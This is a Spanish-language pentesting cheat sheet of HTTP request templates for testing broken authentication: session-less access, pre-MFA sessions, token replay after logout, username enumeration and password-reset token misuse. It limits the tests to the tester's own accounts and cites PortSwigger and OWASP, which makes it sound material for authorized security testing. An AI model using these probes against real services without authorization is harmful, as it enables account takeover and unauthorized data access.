# 🗡️ Autenticación rota: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Rutas privadas sin sesión

```text
GET /api/me
GET /api/account
GET /api/profile
GET /api/orders/{ID_PEDIDO_PROPIO}
GET /api/settings
```

**Cuándo usarlo:** Repetir sin Cookie ni Authorization y comparar con la respuesta autenticada de una cuenta propia. Un 200 con shell HTML no acredita exposición.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/authentication).


### Campos de identidad en login

```text
username={USUARIO_PROPIO}&password={CLAVE_DE_PRUEBA}
email={EMAIL_PROPIO}&password={CLAVE_DE_PRUEBA}
login={USUARIO_PROPIO}&password={CLAVE_DE_PRUEBA}
username={USUARIO_INEXISTENTE_DE_PRUEBA}&password={CLAVE_DE_PRUEBA}
```

**Cuándo usarlo:** Comparar mensajes, códigos y longitud a baja frecuencia. Usa identidades de prueba; la discrepancia debe ser estable para indicar enumeración.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/authentication/password-based).


## 🧭 Payloads por contexto

### Estado incompleto de autenticación

```text
GET /api/me                     Cookie: session={COOKIE_TRAS_PASSWORD}
GET /api/account/settings       Cookie: session={COOKIE_MFA_PENDIENTE}
GET /api/billing                Cookie: session={COOKIE_MFA_PENDIENTE}
GET /api/me                     Authorization: Bearer {TOKEN_PRE_MFA_PROPIO}
```

**Cuándo usarlo:** Solo en una cuenta propia con MFA. Compara la misma ruta después del segundo factor; acceso a datos o funciones privadas antes de MFA confirma el fallo.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/authentication/multi-factor).


### Revocación tras eventos de cuenta

```text
GET /api/me  Cookie: session={COOKIE_ANTES_DE_LOGOUT}
GET /api/me  Cookie: session={COOKIE_ANTES_DE_CAMBIAR_CLAVE}
GET /api/me  Authorization: Bearer {TOKEN_ANTES_DE_LOGOUT}
GET /api/me  Authorization: Bearer {TOKEN_ANTES_DE_RESET}
```

**Cuándo usarlo:** Guardar solo identificadores de sesión de tu cuenta y descartar luego. Valorar contra la política de revocación anunciada y la expiración real del token.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/authentication/other-mechanisms).


## 🔥 Payloads avanzados

### Autenticación desigual por superficie

```text
GET /account/profile
GET /api/account/profile
GET /api/v1/account/profile
GET /api/v2/account/profile
GET /graphql?query={viewer{id}}
```

**Cuándo usarlo:** Cuando la misma función existe en web, API y GraphQL, comparar sin sesión y con sesión propia. No inferir bypass de un endpoint que solo devuelve datos públicos.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/access-control).


## 🔬 Pruebas guiadas por escenario

### 1. Ruta privada sin credenciales

**Objetivo:** Repetir una lectura privada propia sin cookie ni bearer token.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Comparar con la respuesta autenticada de A. Un 200 de la SPA sin datos privados no confirma bypass.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication).

### 2. Sesión pendiente de MFA

**Objetivo:** Detener el login tras la contraseña y visitar directamente una función protegida.

```http
GET /api/account/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_MFA_PENDIENTE}
```

**Interpretación:** Solo es bypass si la sesión intermedia obtiene contenido o ejecuta acciones reservadas al estado autenticado.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/multi-factor).

### 3. Logout y replay

**Objetivo:** Comprobar si el token propio previo sigue autorizando después de cerrar sesión.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_PROPIO_ANTES_DEL_LOGOUT}
```

**Interpretación:** Distinguir un token stateless todavía válido por diseño de una promesa explícita de revocación inmediata.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/other-mechanisms).

### 4. Cambio de contraseña y sesión anterior

**Objetivo:** Tras cambiar la contraseña de A, intentar una request con la sesión antigua de A.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_A_ANTERIOR_AL_CAMBIO}
```

**Interpretación:** Verificar la política anunciada: algunos productos revocan todas las sesiones, otros permiten excepciones explícitas.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/other-mechanisms).

### 5. Enumeración por respuesta

**Objetivo:** Comparar dos correos de prueba, uno existente y otro inexistente, sin intentar contraseñas ajenas.

```http
POST /login HTTP/1.1
Host: {ORIGEN}
Content-Type: application/x-www-form-urlencoded

username={EMAIL_PROPIO}&password=incorrecta-de-prueba

# Control: username={EMAIL_INEXISTENTE_PROPIO}&password=incorrecta-de-prueba
```

**Interpretación:** Repetir con baja frecuencia y comparar mensaje, código y longitud. Diferencias de red o WAF no prueban enumeración.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/password-based).

### 6. Recordarme tras invalidar la sesión

**Objetivo:** Comprobar si un token remember-me propio restaura acceso cuando la sesión fue revocada.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Cookie: remember-me={TOKEN_RECORDAR_PROPIO}
```

**Interpretación:** El resultado depende de la política de revocación del producto. Documentar qué token creó la nueva sesión.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/other-mechanisms).

### 7. Diferencia web/API

**Objetivo:** Usar el mismo estado anónimo en una ruta web y su operación API equivalente.

```http
GET /api/v1/profile HTTP/1.1
Host: {ORIGEN}
Accept: application/json
```

**Interpretación:** Una UI que redirige al login no protege automáticamente la API; confirmar datos privados en el cuerpo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication).

### 8. Cambio de contraseña sin contraseña actual

**Objetivo:** Solo si el flujo legítimo exige reautenticación, omitir currentPassword al cambiar la contraseña propia.

```http
POST /api/account/password HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A}
Content-Type: application/json

{"newPassword":"{NUEVA_PASSWORD_PROPIA}"}
```

**Interpretación:** Confirmar que cambió la contraseña con un nuevo login de A. Una respuesta 200 sin cambio no demuestra bypass.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/other-mechanisms).

### 9. Token de reset ligado a otra cuenta

**Objetivo:** Con dos cuentas propias, presentar a A un token de recuperación emitido para B.

```http
POST /reset-password HTTP/1.1
Host: {ORIGEN}
Content-Type: application/x-www-form-urlencoded

username={EMAIL_A}&token={TOKEN_RESET_B}&new-password={PASSWORD_TEMPORAL_A}
```

**Interpretación:** Comprobar desde A y B qué credencial cambió. El token debe estar ligado a la identidad y al propósito previsto.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/other-mechanisms).

### 10. Token de reset reutilizado

**Objetivo:** Intentar un segundo uso de un token propio ya consumido, sin afectar cuentas ajenas.

```http
POST /reset-password HTTP/1.1
Host: {ORIGEN}
Content-Type: application/x-www-form-urlencoded

username={EMAIL_A}&token={TOKEN_RESET_A_YA_USADO}&new-password={OTRA_PASSWORD_PROPIA}
```

**Interpretación:** Debe rechazarse por uso previo; validar el estado con login y no conservar el token completo en evidencia.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html).

### 11. Cuenta sin verificar correo

**Objetivo:** Con cuenta propia recién creada y correo aún no verificado, pedir una función que la política reserva a cuentas verificadas.

```http
GET /api/account/verified-only HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_CUENTA_PROPIA_NO_VERIFICADA}
```

**Interpretación:** La ruta se sustituye por una función real del producto; comprobar el permiso efectivo, no solo una bandera en la UI.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Email_Validation_and_Verification_Cheat_Sheet.html).

### 12. Acción sensible sin reautenticación

**Objetivo:** Si el producto exige contraseña o MFA reciente para cambiar el correo, invocar la API con una sesión propia antigua.

```http
POST /api/account/change-email HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A_SIN_REAUTH_RECIENTE}
Content-Type: application/json

{"email":"{NUEVO_EMAIL_PROPIO}"}
```

**Interpretación:** Confirmar cambio persistido y ausencia de desafío reciente; respetar el período de gracia definido por el producto.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
